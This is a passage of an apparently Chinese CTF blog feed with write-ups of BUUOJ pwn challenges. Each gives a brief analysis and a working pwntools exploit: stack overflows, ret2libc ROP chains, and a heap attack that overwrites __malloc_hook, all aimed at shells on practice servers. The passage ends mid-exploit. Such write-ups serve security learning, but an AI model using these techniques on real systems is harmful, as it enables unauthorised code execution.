"</span>)</span><br><span class="line">    r.sendline(str(<span class="number">2</span>))</span><br><span class="line">    r.recvuntil(<span class="string">":\n"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">    add(<span class="string">'a'</span>,<span class="string">'a'</span>)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">"\x60"</span>,<span class="string">"aa"</span>)</span><br><span class="line">heapbase=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) &amp;<span class="number">0xfffffffffffff000</span></span><br><span class="line">log.info(hex(heapbase))</span><br><span class="line">add(<span class="string">'\x70'</span>,<span class="string">'aa'</span>)</span><br><span class="line">add(<span class="string">'\x70'</span>,p64(<span class="number">0x71</span>)+p64(heapbase+<span class="number">0x270</span>))</span><br><span class="line">add(<span class="string">'\x70'</span>,p64(<span class="number">0x71</span>)+<span class="string">'a'</span>*<span class="number">0x58</span>+p64(<span class="number">0x481</span>))</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="string">'\x70'</span>,<span class="string">'a'</span>*<span class="number">0x68</span>)</span><br><span class="line">r.recv(<span class="number">0x6f</span>)</span><br><span class="line">libc = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">log.info(hex(libc))</span><br><span class="line">malloc_hook = libc +<span class="number">0x3ebc30</span></span><br><span class="line"></span><br><span class="line">add(p64(malloc_hook),<span class="string">'a'</span>)</span><br><span class="line">add(<span class="string">'\xa0'</span>,<span class="string">'a'</span>)</span><br><span class="line">add(p64(<span class="number">0x4f322</span>+libc),<span class="string">'a'</span>)</span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">r.sendline(str(<span class="number">1</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;center&gt;&lt;font size=&quot;5&quot;&gt;info&lt;/font&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="https://leave-Devour.github.io/categories/pwn/"/>
    
    
      <category term="刷题" scheme="https://leave-Devour.github.io/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>BUUOJ刷题(1)</title>
    <link href="https://leave-devour.github.io/2020/05/04/BUUOJ%E5%88%B7%E9%A2%98-1/"/>
    <id>https://leave-devour.github.io/2020/05/04/BUUOJ%E5%88%B7%E9%A2%98-1/</id>
    <published>2020-05-04T12:25:57.000Z</published>
    <updated>2020-05-06T11:05:34.262Z</updated>
    
    <content type="html"><![CDATA[<center><font size="5">info</font></center><a id="more"></a><h2 id="1、test-your-nc"><a href="#1、test-your-nc" class="headerlink" title="1、test_your_nc"></a>1、test_your_nc</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="/images/Snipaste_2020-04-28_13-15-11.jpg" alt="Snipaste_2020-04-28_13-15-11"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">直接nc 上去拿flag</span><br></pre></td></tr></table></figure><p><img src="/images/Snipaste_2020-04-28_13-12-04.jpg" alt="Snipaste_2020-04-28_13-12-04"></p><h2 id="2、rip"><a href="#2、rip" class="headerlink" title="2、rip"></a>2、rip</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p><img src="/images/Snipaste_2020-04-28_13-21-27.jpg" alt="Snipaste_2020-04-28_13-21-27"></p><p>有<code>gets</code>函数，然后没有限制size，所以有溢出</p><p><img src="/images/Snipaste_2020-04-28_13-21-51.jpg" alt="Snipaste_2020-04-28_13-21-51"></p><p>函数里面有 <code>system(&#39;/sh/bin&#39;)</code>。直接覆盖rip跳过去就完事</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p = process('./pwn1')</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29419</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">7</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x0000000000401186</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="3、warmup-csaw-2016"><a href="#3、warmup-csaw-2016" class="headerlink" title="3、warmup_csaw_2016"></a>3、warmup_csaw_2016</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p><img src="/images/image-20200429132900713.png" alt="image-20200429132900713"><img src="/images/image-20200429132928292.png" alt="image-20200429132928292"></p><p><code>gets</code>函数存在溢出，然后程序有后门。直接溢出修改rip。</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">host = <span class="string">"node3.buuoj.cn"</span></span><br><span class="line">port = <span class="number">26509</span></span><br><span class="line">s       = <span class="keyword">lambda</span> x                  :orda.send(str(x))</span><br><span class="line">sa      = <span class="keyword">lambda</span> x, y                 :orda.sendafter(str(x),str(y)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> x                   :orda.sendline(str(x)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> x, y                 :orda.sendlineafter(str(x), str(y)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :orda.recv(numb)</span><br><span class="line">rc        = <span class="keyword">lambda</span>                     :orda.recvall()</span><br><span class="line">ru      = <span class="keyword">lambda</span> x, drop=<span class="literal">True</span>          :orda.recvuntil(x, drop)</span><br><span class="line">rr        = <span class="keyword">lambda</span> x                    :orda.recvrepeat(x)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :orda.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> x   :u32(x.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> x   :u64(x.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbase_b64</span><span class="params">(t)</span>:</span></span><br><span class="line">    pid=proc.pidof(s)[<span class="number">0</span>]</span><br><span class="line">    pie_pwd =<span class="string">'/proc/'</span>+str(pid)+<span class="string">'/maps'</span></span><br><span class="line">    f_pie=open(pie_pwd)</span><br><span class="line">    <span class="keyword">return</span> f_pie.read()[:<span class="number">12</span>]</span><br><span class="line">orda = remote(host,port)</span><br><span class="line"><span class="comment">#orda = process('./warmup_csaw_2016')</span></span><br><span class="line">ru(<span class="string">"WOW:"</span>)</span><br><span class="line">target = int(ru(<span class="string">"\n"</span>),<span class="number">16</span>)</span><br><span class="line">log.info(hex(target))</span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(target)+p64(<span class="number">0</span>)</span><br><span class="line">sla(<span class="string">"&gt;"</span>,payload)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h2 id="4、pwn1-sctf-2016"><a href="#4、pwn1-sctf-2016" class="headerlink" title="4、pwn1_sctf_2016"></a>4、pwn1_sctf_2016</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p><img src="/images/image-20200429140725109.png" alt="image-20200429140725109"></p><p>很清楚，这是一个c++编写的程序，然后 用 <code>you</code> 替换<code>I</code>，<code>strcpy</code> copy 的时候 没有size限制，所以当 输入 I的数量达到一定的时候就能发生溢出。</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">host = <span class="string">"node3.buuoj.cn"</span></span><br><span class="line">port = <span class="number">26579</span></span><br><span class="line">s       = <span class="keyword">lambda</span> x                  :orda.send(str(x))</span><br><span class="line">sa      = <span class="keyword">lambda</span> x, y                 :orda.sendafter(str(x),str(y)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> x                   :orda.sendline(str(x)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> x, y                 :orda.sendlineafter(str(x), str(y)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :orda.recv(numb)</span><br><span class="line">rc        = <span class="keyword">lambda</span>                     :orda.recvall()</span><br><span class="line">ru      = <span class="keyword">lambda</span> x, drop=<span class="literal">True</span>          :orda.recvuntil(x, drop)</span><br><span class="line">rr        = <span class="keyword">lambda</span> x                    :orda.recvrepeat(x)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :orda.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> x   :u32(x.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> x   :u64(x.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbase_b64</span><span class="params">(t)</span>:</span></span><br><span class="line">    pid=proc.pidof(s)[<span class="number">0</span>]</span><br><span class="line">    pie_pwd =<span class="string">'/proc/'</span>+str(pid)+<span class="string">'/maps'</span></span><br><span class="line">    f_pie=open(pie_pwd)</span><br><span class="line">    <span class="keyword">return</span> f_pie.read()[:<span class="number">12</span>]</span><br><span class="line">orda = remote(host,port)</span><br><span class="line"><span class="comment">#orda = process('./pwn1_sctf_2016')</span></span><br><span class="line">payload = <span class="string">"I"</span>*<span class="number">21</span>+<span class="string">'a'</span> +p32(<span class="number">0x8048F0D</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h2 id="5、ciscn-2019-n-1"><a href="#5、ciscn-2019-n-1" class="headerlink" title="5、ciscn_2019_n_1"></a>5、ciscn_2019_n_1</h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p><img src="/images/image-20200429174942245.png" alt="image-20200429174942245"></p><p><code>gets</code> 函数存在溢出，然后要溢出成float ，但是data 段有这个数。</p><p><img src="/images/image-20200429175052710.png" alt="image-20200429175052710"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> x                  :orda.send(str(x))</span><br><span class="line">sa      = <span class="keyword">lambda</span> x, y                 :orda.sendafter(str(x),str(y)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> x                   :orda.sendline(str(x)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> x, y                 :orda.sendlineafter(str(x), str(y)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :orda.recv(numb)</span><br><span class="line">rc        = <span class="keyword">lambda</span>                     :orda.recvall()</span><br><span class="line">ru      = <span class="keyword">lambda</span> x, drop=<span class="literal">True</span>          :orda.recvuntil(x, drop)</span><br><span class="line">rr        = <span class="keyword">lambda</span> x                    :orda.recvrepeat(x)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :orda.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> x   :u32(x.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> x   :u64(x.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbase_b64</span><span class="params">(t)</span>:</span></span><br><span class="line">    pid=proc.pidof(s)[<span class="number">0</span>]</span><br><span class="line">    pie_pwd =<span class="string">'/proc/'</span>+str(pid)+<span class="string">'/maps'</span></span><br><span class="line">    f_pie=open(pie_pwd)</span><br><span class="line">    <span class="keyword">return</span> f_pie.read()[:<span class="number">12</span>]</span><br><span class="line">s = <span class="string">"node3.buuoj.cn:28139"</span></span><br><span class="line">host = s.split(<span class="string">":"</span>)[<span class="number">0</span>]</span><br><span class="line">port = int(s.split(<span class="string">":"</span>)[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    orda = remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    orda = process(<span class="string">'./ciscn_2019_n_1'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x2c</span>+p32(<span class="number">0x41348000</span>)+p32(<span class="number">0</span>)</span><br><span class="line">sla(<span class="string">".\n"</span>,payload)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h2 id="6-、ciscn-2019-c-1"><a href="#6-、ciscn-2019-c-1" class="headerlink" title="6 、ciscn_2019_c_1"></a>6 、ciscn_2019_c_1</h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>开始有个加密，是xor，然后<code>gets</code> 溢出</p><p><img src="/images/image-20200429193228689.png" alt="image-20200429193228689"></p><p>既然是 <code>xor</code> 那我就送进去之前加密一次，然后他再 加密就是 我的payload</p><p>比如 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = 0x40</span><br><span class="line">a^0xd^0xd = a</span><br></pre></td></tr></table></figure><p>溢出首先要泄露libc，然后 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">system(&apos;/bin/sh\x00&apos;)</span><br><span class="line">执行system的时候有个指令要注意，就是movaps 好像是这个，执行这个的时候，rsp&amp;0xf = 0</span><br><span class="line">这个指令是16字节对齐，不然就抛出异常</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> x                  :orda.send(str(x))</span><br><span class="line">sa      = <span class="keyword">lambda</span> x, y                 :orda.sendafter(str(x),str(y)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> x                   :orda.sendline(str(x)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> x, y                 :orda.sendlineafter(str(x), str(y)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :orda.recv(numb)</span><br><span class="line">rc        = <span class="keyword">lambda</span>                     :orda.recvall()</span><br><span class="line">ru      = <span class="keyword">lambda</span> x, drop=<span class="literal">True</span>          :orda.recvuntil(x, drop)</span><br><span class="line">rr        = <span class="keyword">lambda</span> x                    :orda.recvrepeat(x)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :orda.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> x   :u32(x.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> x   :u64(x.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbase_b64</span><span class="params">(t)</span>:</span></span><br><span class="line">    pid=proc.pidof(s)[<span class="number">0</span>]</span><br><span class="line">    pie_pwd =<span class="string">'/proc/'</span>+str(pid)+<span class="string">'/maps'</span></span><br><span class="line">    f_pie=open(pie_pwd)</span><br><span class="line">    <span class="keyword">return</span> f_pie.read()[:<span class="number">12</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deal_with</span><span class="params">(s)</span>:</span></span><br><span class="line">    m = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> range(len(s)):</span><br><span class="line">        <span class="keyword">if</span> ord(s[c]) &lt;= <span class="number">0x60</span> <span class="keyword">or</span> ord(s[c]) &gt;<span class="number">0x7a</span>:</span><br><span class="line">            <span class="keyword">if</span> ord(s[c]) &lt;= <span class="number">0x40</span> <span class="keyword">or</span> ord(s[c]) &gt;  <span class="number">0x5a</span>:</span><br><span class="line">                <span class="keyword">if</span> ord(s[c]) &gt; <span class="number">0x2f</span> <span class="keyword">and</span> ord(s[c]) &lt;=<span class="number">0x39</span>:</span><br><span class="line">                    m = m+chr(ord(s[c])^<span class="number">0xf</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    m = m+s[c]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                m = m+chr(ord(s[c])^<span class="number">0xe</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            m = m+chr(ord(s[c])^<span class="number">0xd</span>)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">s = <span class="string">"node3.buuoj.cn:26317"</span></span><br><span class="line">host = s.split(<span class="string">":"</span>)[<span class="number">0</span>]</span><br><span class="line">port = int(s.split(<span class="string">":"</span>)[<span class="number">1</span>])</span><br><span class="line">elf = ELF(<span class="string">"ciscn_2019_c_1"</span>)</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    orda = remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    orda = process(<span class="string">'./ciscn_2019_c_1'</span>)</span><br><span class="line">sla(<span class="string">"Input your choice!\n"</span>,str(<span class="number">1</span>))</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x50</span> +p64(<span class="number">0</span>)+p64(<span class="number">0x0400c83</span>)+p64(elf.got[<span class="string">'puts'</span>])+p64(elf.plt[<span class="string">'puts'</span>])+p64(<span class="number">0x0400790</span>)+p64(<span class="number">0</span>)*<span class="number">0x40</span></span><br><span class="line">sla(<span class="string">"encrypted\n"</span>,deal_with(payload))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">    ru(<span class="string">'\n'</span>)</span><br><span class="line">puts_addr = uu64(ru(<span class="string">"\n"</span>))</span><br><span class="line">libc =LibcSearcher(<span class="string">"puts"</span>,puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">"puts"</span>)</span><br><span class="line">bin_sh = libcbase + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">log.info(<span class="string">"libc:"</span>+hex(libcbase))</span><br><span class="line">log.info(<span class="string">"sh_bin:"</span>+hex(bin_sh))</span><br><span class="line">log.info(<span class="string">"system_addr:"</span>+hex(system_addr))</span><br><span class="line">sla(<span class="string">"Input your choice!\n"</span>,str(<span class="number">1</span>))</span><br><span class="line">raw_input()</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x50</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x400c83</span>)+p64(bin_sh)+p64(<span class="number">0x400c81</span>)+p64(bin_sh)*<span class="number">2</span>+p64(system_addr)</span><br><span class="line">sla(<span class="string">"encrypted\n"</span>,payload)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h2 id="7、-OGeek2019-babyrop"><a href="#7、-OGeek2019-babyrop" class="headerlink" title="7、[OGeek2019]babyrop"></a>7、[OGeek2019]babyrop</h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_80486BB();</span><br><span class="line">  fd = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">    read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = sub_804871F(buf);</span><br><span class="line">  sub_80487D0(v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_804871F</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+Ch] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">7</span>]; <span class="comment">// [esp+2Ch] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v5; <span class="comment">// [esp+33h] [ebp-25h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">"%ld"</span>, a1);</span><br><span class="line">  v6 = read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);</span><br><span class="line">  buf[v6 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, &amp;s, v1) )<span class="comment">// 关键</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Correct\n"</span>, <span class="number">8u</span>);</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">ssize_t</span> __<span class="function">cdecl <span class="title">sub_80487D0</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+11h] [ebp-E7h]  </span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0x7F</span> )</span><br><span class="line">    result = read(<span class="number">0</span>, &amp;buf, <span class="number">0xC8</span>u);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = read(<span class="number">0</span>, &amp;buf, a1); <span class="comment">// 溢出</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前面的 过了 <code>strcmp</code> 检测，就能到下面的溢出，然后strcmp 遇到<code>\x00</code>直接放回ture，就能绕过前面，后面溢出也是常规里面，但是又libc 就直接 <code>onegadgets</code></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 